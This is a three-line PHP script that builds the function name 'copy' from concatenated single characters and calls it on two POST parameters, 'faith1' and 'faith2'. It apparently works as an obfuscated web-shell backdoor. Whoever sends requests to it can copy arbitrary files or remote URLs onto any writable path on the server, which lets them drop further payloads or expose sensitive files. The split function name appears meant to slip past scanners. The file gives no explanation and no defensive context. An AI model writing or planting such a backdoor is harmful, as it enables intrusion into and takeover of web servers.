<?php 
$reg="c"."o"."p"."y";
$reg($_POST['faith1'],$_POST['faith2']);
 
?>